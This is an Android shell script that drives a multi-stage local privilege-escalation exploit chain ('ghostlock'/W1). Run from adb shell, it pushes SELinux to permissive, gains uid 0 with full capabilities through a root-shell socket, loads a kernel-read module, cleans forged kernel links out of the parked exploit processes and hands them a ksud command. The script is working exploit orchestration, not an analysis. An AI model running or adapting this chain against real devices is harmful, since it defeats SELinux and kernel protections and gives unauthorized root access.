#!/system/bin/sh
# gl-chain.sh -- one driver for the whole chain, run from adb shell (uid 2000).
#
#   sh /data/local/tmp/gl-w1/gl-chain.sh            # steps 1+2, then 3 dry run
#   sh /data/local/tmp/gl-w1/gl-chain.sh --apply    # steps 1+2, then 3 apply
#
#   1) W1 from adb shell (uid 2000, no root)                -> park① (uid 2000)
#   2) self cred write through the Magica root-shell channel -> park② (uid 0,
#      full caps) + finit_module kread_min.ko + records the ksud command
#   3) for every ghostlock pid: erase the forged PI links with kread, read them
#      back to verify, hand the recorded command (/data/adb/ksud late-load) to
#      that process to run with its own caps, wait for .done, then kill -9
#
# Steps 2 and 3 run *inside* the Magica server (uid 0) via its unix socket,
# because /proc/kread is 0600 root and only that channel is independent of adb.
DIR=/data/local/tmp/gl-w1
RS="$DIR/rshell"
APPLY=""
[ "${1:-}" = "--apply" ] && APPLY="--apply"

miss=0
for f in "$DIR/ghostlock" "$DIR/profile.bin" "$DIR/w1.sh" "$RS" \
         "$DIR/rshell.sock" "$DIR/rshell.token" "$DIR/cleanup-parked.sh" \
         $DIR/kread_min.ko; do
    [ -e "$f" ] || { echo "MISSING: $f"; miss=1; }
done
[ "$miss" = 1 ] && exit 2

echo "== versions"
ls -l "$DIR/ghostlock" "$DIR/cleanup-parked.sh" $DIR/kread_min.ko
grep -qa 'parked.d' "$DIR/ghostlock" ||
    { echo "ghostlock is OLD (no parked.d marker) -- copy /sdcard/gl-w1c-self/ghostlock first"; exit 2; }
grep -qa 'find_task_by_pid' "$DIR/cleanup-parked.sh" ||
    echo "cleanup-parked.sh: WARNING unknown version (no find_task_by_pid)"

echo "== 1) W1 (uid $(id -u))"
# Judge by the current *state*, not by a line in w1.log: the log survives a reboot
# while SELinux comes back enforcing, so a stale "parking after W1" would skip the
# only step that gets us permissive (and w1c.sh then refuses with exit 4).
if [ "$(cat /sys/fs/selinux/enforce 2>/dev/null)" = "0" ] && pidof ghostlock >/dev/null 2>&1; then
    echo "already permissive with a parked W1 (pid $(pidof ghostlock)) -- skipping"
else
    sh "$DIR/w1.sh"
fi
grep -qa 'parking after W1' "$DIR/w1.log" 2>/dev/null ||
    { echo "WARNING: $DIR/w1.log has no 'parking after W1' line"; }
[ "$(cat /sys/fs/selinux/enforce 2>/dev/null)" = "0" ] ||
    echo "WARNING: W1 did not land (still enforcing) -- w1c.sh will refuse"
# The exploit rewrites .ghostlock_root.sh as this uid on every start (umask leaves
# 0755), and the W1c process runs as uid 0 *without* capabilities, so it can only
# rewrite it if we open the mode here -- chmod needs ownership, and this side owns
# the file.
chmod 666 "$DIR/.ghostlock_root.sh" 2>/dev/null

echo "== 2) self cred write + kread_min + ksud command, via rshell (uid 0)"
sh "$RS" "sh $DIR/w1c.sh"
echo "-- w1c.log tail"
tail -8 "$DIR/w1c.log" 2>/dev/null

echo "== 3) cleanup"
pids=$(pidof ghostlock 2>/dev/null)
[ -n "$pids" ] || pids=$(ps -A -o pid,comm 2>/dev/null | awk '$2 == "ghostlock" { printf "%s ", $1 }')
if [ -z "$pids" ]; then
    echo "no ghostlock process found (nothing parked?)"
    exit 0
fi
for p in $pids; do
    echo "-- parked pid=$p"
    if [ "$APPLY" = "--apply" ]; then
        sh "$RS" "sh $DIR/cleanup-parked.sh --apply '' '' $p"
    else
        sh "$RS" "sh $DIR/cleanup-parked.sh '' '' $p"
    fi
done
[ "$APPLY" = "--apply" ] || echo "(dry run -- re-run with: sh $0 --apply)"
